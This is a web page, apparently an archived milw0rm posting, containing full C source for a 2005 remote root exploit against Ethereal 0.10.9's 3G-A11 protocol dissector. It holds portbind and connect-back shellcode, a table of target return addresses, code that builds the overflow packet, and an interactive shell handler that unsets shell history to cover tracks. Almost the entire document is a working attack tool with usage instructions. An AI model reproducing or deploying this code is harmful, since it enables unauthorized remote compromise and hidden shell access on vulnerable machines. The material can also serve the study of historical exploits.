<html><head><title>Ethereal <= 0.10.9 "3G-A11" Remote Buffer Overflow Exploit</title></head><pre>/*
 * Ethereal 0.10.9 and below proof-of-concept remote root exploit
 * (c) 2005 Diego Giagio &lt;dgiagio@irion.com.br&gt;
 *
 * The CDMA2000 A11 protocol dissector (packet-3g-a11.c) has a stack overflow
 * vulnerability when decoding Airlink records. This vulnerability was also
 * discovered by Diego Giagio on 01/March/2005. The vendor was imediatelly
 * contacted.
 *
 *
 * Notes:
 *
 * This program has only been tested on Linux.
 *
 * If your system isn't on the target list and you are running Linux (x86), you
 * can easily find your system's ret address. See below:
 *
 * First you need to force Ethereal dump a core file.
 * bash$ ./ethereal-g3-a11 -a 0xdeadbeef -s 1 -d &lt;your_machine_ip&gt; -p 65535
 *
 * Then, use the script below to find the ret address from the core file:
 * --snip--
 * #!/bin/sh
 *
 * ADDR=`objdump -D -s core | \
 * grep &quot;90909090 90909090 90909090 90909090&quot; | \
 * head -2 | tail -1 | awk '{print 0x$1}'`
 * echo &quot;Address: 0x$ADDR&quot;
 * --snip--
 *
 * Use that address with the -a &lt;address&gt; option. Good luck.
 *
 *
 * Greets:
 *
 * ttaranto, eniac, rogbas, pjoppert, skylazart, cync, runixd,
 * surfer, setnf, cbc, SUiCiDE, _hide, Codak, dm_, nuTshell
 *
 * #buffer@ircs.ircsnet.net
 *
 */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;errno.h&gt;

/*
 * portbind, execve /bin/sh linux shellcode by BreeZe &lt;breeze@binbash.org&gt;
 */
char sc_portbind[] =
&quot;\x31\xc0\x89\x45\x10\x40\x89\xc3\x89\x45\x0c\x40\x89\x45\x08\x8d\x4d\x08&quot;
&quot;\xb0\x66\xcd\x80\x89\x45\x08\x43\x89\x5d\x14\x66\xc7\x45\x16\xff\xff\x31&quot;
&quot;\xc0\x89\x45\x18\x8d\x55\x14\x89\x55\x0c\xc6\x45\x10\x10\xb0\x66\xcd\x80&quot;
&quot;\x40\x89\x45\x0c\x43\x43\xb0\x66\xcd\x80\x43\x89\x45\x0c\x89\x45\x10\xb0&quot;
&quot;\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0&quot;
&quot;\x3f\xcd\x80\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46&quot;
&quot;\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff&quot;
&quot;\x2f\x62\x69\x6e\x2f\x73\x68\x54\x52\x4f\x45\x50\x4a\x55\x48\x53&quot;;

/*
 * connectback, execve /bin/sh linux shellcode by BreeZe &lt;breeze@binbash.org&gt;
 * slighty modified by Diego Giagio &lt;dgiagio@irion.com.br&gt;
 */
char sc_connectback[] = 
&quot;\x31\xc0\x89\x45\x10\x40\x89\xc3\x89\x45\x0c\x40\x89\x45\x08\x8d\x4d\x08&quot;
&quot;\xb0\x66\xcd\x80\x89\x45\x08\x43\x89\x5d\x14\x43\x66\xc7\x45\x16\xff\xff&quot;
&quot;\xc7\x45\x18\xc6\x51\x81\x64\x8d\x55\x14\x89\x55\x0c\xc6\x45\x10\x10\xb0&quot;
&quot;\x66\xcd\x80\x8b\x5d\x08\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41&quot;
&quot;\xb0\x3f\xcd\x80\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89&quot;
&quot;\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff&quot;
&quot;\xff\x2f\x62\x69\x6e\x2f\x73\x68\x54\x52\x4f\x45\x50\x4a\x55\x48\x53&quot;;


typedef enum
{
    SC_NULL         = -1,
    SC_PORTBIND     =  1,
    SC_CONNECTBACK  =  2
} shellcode_type_t;

struct shellcode_t
{
    int id;

    shellcode_type_t type;

    char *desc;
    char *data;

    int host_offset;
    int port_offset;
};

struct shellcode_t shellcode_list[] =
{
    {1,  SC_PORTBIND,    &quot;portbind&quot;,    sc_portbind,    -1, 33},
    {2,  SC_CONNECTBACK, &quot;connectback&quot;, sc_connectback, 39, 34},
    {-1, SC_NULL, NULL, NULL, -1, -1}
};

struct target_t
{
    int   id;
    char *desc;
    long  addr;
};

struct target_t target_list[] =
{
    {1,  &quot;Slackware 10.1      - ethereal 0.10.9 from source&quot;,   0x0812d110},
    {2,  &quot;Slackware 10.1      - tethereal 0.10.9 from source&quot;,  0x081f30d0},
    {3,  &quot;Fedora Core 3       - ethereal  0.10.9 from rpm&quot;,     0x08117a80},
    {4,  &quot;Fedora Core 3       - tethereal 0.10.9 from rpm&quot;,     0x08690ac0},
    {4,  &quot;Gentoo 2004.3       - tethereal 0.10.9 from portage&quot;, 0x081c3d90},
    {-1, NULL, -1}
};

#define PROTO_3G_A11_PORT 699

char proto_3g_a11_begin[] =
&quot;\x01&quot;             // a11 message type - registration request
&quot;\x0a&quot;             // flags
&quot;\xff\xff&quot;         // lifetime 0000 to ffff
&quot;\x00\x00\x00\x00&quot; // home address
&quot;\xf0\x00\xba\x00&quot; // home agent addr - any addr
&quot;\x00\x00\x00\x00&quot; // care of addr - any addr
&quot;\xde\xad\xbe\xef\xd0\x00\x00\x0d&quot; // identification
&quot;\x26&quot;             // ext type - CVSE_EXT
&quot;\x00&quot;             // nada
&quot;\xff\xff&quot;         // ext len
&quot;\x00\x00\x00\x00&quot; // vse vid
&quot;\x01\x01&quot;         // vse apptype 0x0101
;

char proto_3g_a11_before_shellcode[] =
&quot;\x1a&quot; // radius vendor specific
&quot;\xff&quot; // len
;

char proto_3g_a11_before_retaddrs[] =
&quot;\x1f&quot; // radius ad-hoc
&quot;\xfe&quot; // len
;

static int
find_shellcode_by_id (int id, struct shellcode_t **sc)
{
    int i;

    for (i=0; shellcode_list[i].id != -1; i++)
    {
	if (shellcode_list[i].id == id)
	{
	    *sc = &amp;shellcode_list[i];
	    return 0;
	}
    }

    return -1;
}

static int
find_target_by_id (int id, struct target_t **target)
{
    int i;

    for (i=0; target_list[i].id != -1; i++)
    {
	if (target_list[i].id == id)
	{
	    *target = &amp;target_list[i];
	    return 0;
	}
    }

    return -1;
}

int
parse_ip (const char *ipstr, long *ip)
{
    int a, b, c, d;

    if (sscanf (ipstr, &quot;%d.%d.%d.%d&quot;, &amp;a, &amp;b, &amp;c, &amp;d) != 4)
	return -1;

    *ip  = (d &amp; 0x000000ff);
    *ip |= (c &amp; 0x000000ff) &lt;&lt; 8;
    *ip |= (b &amp; 0x000000ff) &lt;&lt; 16;
    *ip |= (a &amp; 0x000000ff) &lt;&lt; 24;

    return 0;
}

static int
sock_create (int type, int proto)
{
    struct linger l;
    int sock;
    int sockopt;
    int ret;
    
    sock = socket (type, proto, 0);
    if (sock &lt; 0)
	return -1;
    
    l.l_onoff  = 1;
    l.l_linger = 0;
    ret = setsockopt (sock, SOL_SOCKET, SO_LINGER, &amp;l, sizeof (l));
    if (ret &lt; 0)
    {
	close (sock);
	return -2;
    }
    
    sockopt = 1;
    ret = setsockopt (sock, SOL_SOCKET, SO_REUSEADDR, &amp;sockopt,
		      sizeof (sockopt));
    if (ret &lt; 0)
    {
	close (sock);
	return -3;
    }

    return sock;
}

static int
sock_udp_create (void)
{
    return sock_create (AF_INET, SOCK_DGRAM);
}

static int
sock_tcp_create (void)
{
    return sock_create (AF_INET, SOCK_STREAM);
}

static int
sock_connect (int sock, long host, int port)
{
    struct sockaddr_in addr;

    memset (&amp;addr, 0, sizeof (addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons (port);
    addr.sin_addr.s_addr = htonl (host);

    if (connect (sock, (struct sockaddr *)&amp;addr, sizeof (addr)) &lt; 0)
	return -1;

    return sock;
}

static int
sock_bind (int sock, long host, int port)
{
    struct sockaddr_in addr;

    memset (&amp;addr, 0, sizeof (addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons (port);
    addr.sin_addr.s_addr = htonl (host);

    if (bind (sock, (struct sockaddr *)&amp;addr, sizeof (addr)) &lt; 0)
	return -1;

    if (listen (sock, 1) &lt; 0)
	return -1;
}

static int
sock_accept (int sock)
{
    fd_set fds;
    struct sockaddr_in addr;
    struct timeval tv;
    int new_sock;
    int ret;

    FD_ZERO (&amp;fds);
    FD_SET (sock, &amp;fds);

    tv.tv_sec  = 10;
    tv.tv_usec = 0;

    ret = select (sock + 1, &amp;fds, NULL, NULL, &amp;tv);
    if (ret &lt; 0)
	return -1;

    if (ret == 0)
    {
	errno = ETIMEDOUT;
	return -1;
    }

    if (FD_ISSET (sock, &amp;fds))
    {
	int i = sizeof (addr);

	new_sock = accept (sock, (struct sockaddr *)&amp;addr, &amp;i);
	if (new_sock &lt; 0)
	    return -1;

	return new_sock;
    }

    return -1;
}

static void
sock_disconnect (int sock)
{
    close (sock);
}

static int
sock_send_payload (long dest, int port, char *packet, int packet_len)
{
    int sock;

    /* create udp socket */
    sock = sock_udp_create ();
    if (sock_connect (sock, dest, PROTO_3G_A11_PORT) &lt; 0)
	    return -1;

    /* send packet */
    send (sock, packet, packet_len, 0);

    printf (&quot;[-] UDP packet sent (%d bytes).\n&quot;, packet_len);
    fflush (stdout);

    /* disconnect socket */
    sock_disconnect (sock);

    return 0;
}

static void
shell (int sock)
{
    fd_set fds;
    char *cmd = &quot;unset HISTFILE; /bin/uname -a; /usr/bin/id\n&quot;;
    char  buf [2048];
    int   n;

    printf (&quot;[-] Enjoy your shell\n&quot;);
    printf (&quot;\n&quot;);


    send (sock, cmd, strlen (cmd), 0);

    while (1)
    {
	FD_ZERO (&amp;fds);
	FD_SET (sock, &amp;fds); /* socket */
	FD_SET (0, &amp;fds);    /* stdin */

	if (select (sock + 1, &amp;fds, NULL, NULL, NULL) &lt; 0)
	    break;

	if (FD_ISSET (sock, &amp;fds))
	{
	    if ((n = recv (sock, buf, sizeof (buf), 0)) &lt; 0)
	    {
		perror (&quot;[-] shell(): error reading from socket: recv()&quot;);
		return;
	    }

	    if (n == 0)
		break;

	    if ((write (1, buf, n)) &lt; 0)
	    {
		perror (&quot;[-] shell(): error writing to stdout: write()&quot;);
		return;
	    }
	}

	if (FD_ISSET (0, &amp;fds))
	{
	    if ((n = read (0, buf, sizeof (buf))) &lt; 0)
	    {
		perror (&quot;[-] shell(): error reading from stdin: read()&quot;);
		return;
	    }

	    if ((send (sock, buf, n, 0)) &lt; 0)
	    {
		perror (&quot;[-] shell(): error writing to socket: send()&quot;);
		return;
	    }

	    if (n == 0)
		break;
	}
    }

    printf (&quot;[-] Connection closed.\n&quot;);
}

static void
shell_portbind (long dest, int port, char *packet, int packet_len)
{
    int sock;


    if (sock_send_payload (dest, port, packet, packet_len) &lt; 0)
    {
	perror (&quot;[-] Unable to send payload&quot;);
	return;
    }

    sock = sock_tcp_create ();
    if (sock &lt; 0)
    {
	perror (&quot;[-] Error creating socket&quot;);
	return;
    }

    printf (&quot;[-] Delaying 3 seconds before connection attempt (portbind).&quot;);
    fflush (stdout);
    sleep (1);
    printf (&quot;.&quot;);
    fflush (stdout);
    sleep (1);
    printf (&quot;.&quot;);
    fflush (stdout);
    sleep (1);
    printf (&quot;\n&quot;);

    if (sock_connect (sock, dest, port) &lt; 0)
    {
	perror (&quot;[-] Unable to connect&quot;);
	return;
    }

    shell (sock);
    sock_disconnect (sock);
}

static void
shell_connectback (long host, int port, long dest,
		   char *packet, int packet_len)
{
    int sock;
    int new_sock;

    sock = sock_tcp_create ();
    if (sock &lt; 0)
    {
	perror (&quot;[-] Error creating socket&quot;);
	return;
    }

    /* we bind before sending the payload to avoid not being
     * listening when the connectback shellcode tries to connect
     */
    if (sock_bind (sock, host, port) &lt; 0)
    {
	perror (&quot;[-] Unable to bind/listen&quot;);
	return;
    }

    if (sock_send_payload (dest, port, packet, packet_len) &lt; 0)
    {
	perror (&quot;[-] Unable to send payload&quot;);
	return;
    }

    printf (&quot;[-] Waiting 10s for incoming connection (connectback)...\n&quot;);
    fflush (stdout);

    new_sock = sock_accept (sock);
    if (new_sock &lt; 0)
    {
	perror (&quot;[-] Unable to accept connection&quot;);
	return;
    }

    sock_disconnect (sock);

    shell (new_sock);
    sock_disconnect (new_sock);
}

static void
prog_info (void)
{
    printf (&quot;Ethereal 0.10.9 and below proof-of-concept remote exploit.\n&quot;);
    printf (&quot;(c) 2005 Diego Giagio &lt;dgiagio@irion.com.br&gt;\n&quot;);
    printf (&quot;\n&quot;);
}

static void
usage (const char *prog)
{
    int i;

    prog_info ();

    printf (&quot;Usage:\n&quot;);
    printf (&quot;  [-] %s -t &lt;target&gt; -s &lt;shellcode&gt; -d &lt;dest ip&gt; &quot;
	    &quot;-h &lt;host&gt; -p &lt;port&gt;\n&quot;
	    &quot;  [-] %s -a &lt;addr&gt;   -s &lt;shellcode&gt; -d &lt;dest ip&gt; &quot;
	    &quot;-h &lt;host&gt; -p &lt;port&gt;\n&quot;, prog, prog);

    printf (&quot;\n&quot;);

    printf (&quot;Target:\n&quot;);
    for (i=0; target_list[i].id != -1; i++)
    {
	printf (&quot;  [-] %d. %s, addr: 0x%x\n&quot;,
		target_list[i].id, target_list[i].desc, target_list[i].addr);
    }

    printf (&quot;\n&quot;);

    printf (&quot;Shellcode:\n&quot;);
    for (i=0; shellcode_list[i].id != -1; i++)
    {
	printf (&quot;  [-] %d. %s\n&quot;,
		shellcode_list[i].id,
		shellcode_list[i].desc);
    }

    printf (&quot;\n&quot;);

    printf (&quot;Info:\n&quot;);
    printf (&quot;  [-] 1. When using connectback shellcode, you must specify\n&quot;);
    printf (&quot;  [-]    the host to receive the connection (-h).\n&quot;);
    printf (&quot;\n&quot;);
    printf (&quot;  [-] 2. When using portbind shellcode, the option (-h) will \n&quot;);
    printf (&quot;  [-]    have no effect.\n&quot;); 

    printf (&quot;\n&quot;);
}

int
main (int argc, char *argv[])
{
    struct target_t    *target    = NULL;
    struct shellcode_t *shellcode = NULL;
    int    shellcode_len;

    long dest = 0;
    long host = 0;
    int  port = 0;
    long addr = 0;

    int opt;
    int opt_err = 0;
    int i;

    char *ptr_pkt;
    char  pkt[1500];
    int   pkt_len;

    while ((opt = getopt (argc, argv, &quot;t:s:d:h:p:a:&quot;)) != EOF) 
    {
	switch (opt)
	{

	case 't': /* target id */
	    if (find_target_by_id (atoi (optarg), &amp;target) &lt; 0)
	    {
		printf (&quot;Not a valid target id.\n&quot;);
		opt_err ++;
	    }
	    break;

	case 's': /* shellcode id */
	    if (find_shellcode_by_id (atoi (optarg), &amp;shellcode) &lt; 0)
	    {
		printf (&quot;Not a valid shellcode id.\n&quot;);
		opt_err ++;
	    }
	    break;

	case 'd': /* destination */
	    if (parse_ip (optarg, &amp;dest) &lt; 0)
	    {
		printf (&quot;Invalid address for destination.\n&quot;);
		opt_err ++;
	    }
	    break;

	case 'h': /* host for connectback */
	    if (parse_ip (optarg, &amp;host) &lt; 0)
	    {
		printf (&quot;Invalid address for host.\n&quot;);
		opt_err ++;
	    }

	    break;

	case 'p': /* port for connectback or portbind */
	    port = atoi (optarg);
	    if (port &lt; 0 || port &gt; 65535)
	    {
		printf (&quot;Invalid port.\n&quot;);
		opt_err ++;
	    }

	    break;

	case 'a': /* ret address */
	    if (sscanf (optarg, &quot;0x%x&quot;, &amp;addr) != 1)
	    {
		printf (&quot;Invalid address.\n&quot;);
		opt_err ++;
	    }
	    break;

	case '?':
	default:
		usage (argv[0]);
		opt_err ++;
		break;
	}
    }

    if (opt_err != 0)
	return -1;

    if (argc &lt; 2)
    {
	    usage (argv[0]);
	    return 0;
    }

    if (target == NULL &amp;&amp; addr == 0)
    {
	printf (&quot;Please choose either a target (-t) or an address (-a).\n&quot;);
	return -1;
    }

    if (target != NULL &amp;&amp; addr != 0)
    {
	printf (&quot;Target (-t) and address (-a) cannot be used together.\n&quot;);
	return -1;
    }

    addr = target != NULL ? target-&gt;addr : addr;

    if (shellcode == NULL)
    {
	printf (&quot;Please choose a shellcode (-s).\n&quot;);
	return -1;
    }

    shellcode_len = strlen (shellcode-&gt;data);

    if (dest == 0)
    {
	printf (&quot;Please choose a destination (-d).\n&quot;);
	return -1;
    }

    if (shellcode-&gt;host_offset != -1)
    {
	char *ptr;

	if (host == 0)
	{
	    printf (&quot;Please choose a host (-h).\n&quot;);
	    return -1;
	}

	ptr      = shellcode-&gt;data + shellcode-&gt;host_offset;
	*(ptr++) = (host &amp; 0xff000000) &gt;&gt; 24;
	*(ptr++) = (host &amp; 0x00ff0000) &gt;&gt; 16;
	*(ptr++) = (host &amp; 0x0000ff00) &gt;&gt; 8;
	*(ptr++) = (host &amp; 0x000000ff);
    }

    if (shellcode-&gt;port_offset != -1)
    {
	char *ptr;

	if (port == 0)
	{
	    printf (&quot;Please choose a port (-p).\n&quot;);
	    return -1;
	}

	ptr      = shellcode-&gt;data + shellcode-&gt;port_offset;
	*(ptr++) = (port &amp; 0xff00) &gt;&gt; 8;
	*(ptr++) = (port &amp; 0x00ff);
    }


    /* copyright */
    prog_info ();

    /* some info */
    printf (&quot;[-] Using addr 0x%x\n&quot;, addr);
    fflush (stdout);

    /* build packet */
    ptr_pkt = pkt;

    memcpy (ptr_pkt, proto_3g_a11_begin,
	    sizeof (proto_3g_a11_begin));
    ptr_pkt += sizeof (proto_3g_a11_begin) - 1;

    memcpy (ptr_pkt, proto_3g_a11_before_shellcode,
	    sizeof (proto_3g_a11_before_shellcode));
    ptr_pkt += sizeof (proto_3g_a11_before_shellcode) - 1;

    /* shellcode */
    memset (ptr_pkt, 0x90, 255);
    ptr_pkt += 255 - shellcode_len - 2;
    memcpy (ptr_pkt, shellcode-&gt;data, shellcode_len);
    ptr_pkt += shellcode_len;

    memcpy (ptr_pkt, proto_3g_a11_before_retaddrs,
	    sizeof (proto_3g_a11_before_retaddrs));
    ptr_pkt += sizeof (proto_3g_a11_before_retaddrs) - 1;
    
    /* addrs */
    for (i=0; i&lt;254; i+=4)
    {
	ptr_pkt[i]   = (addr &amp; 0x000000ff);
	ptr_pkt[i+1] = (addr &amp; 0x0000ff00) &gt;&gt; 8;
	ptr_pkt[i+2] = (addr &amp; 0x00ff0000) &gt;&gt; 16;
	ptr_pkt[i+3] = (addr &amp; 0xff000000) &gt;&gt; 24;
    }
    ptr_pkt += 254;

    /* calc packet len */
    pkt_len = ptr_pkt - pkt;


    switch (shellcode-&gt;type)
    {
    case SC_PORTBIND:
	shell_portbind (dest, port, pkt, pkt_len);
	break;
    case SC_CONNECTBACK:
	shell_connectback (host, port, dest, pkt, pkt_len);
	break;
    default:
	/* NOT REACHED */
	break;
    }

    return 0;
}



// milw0rm.com [2005-03-14]</pre></html>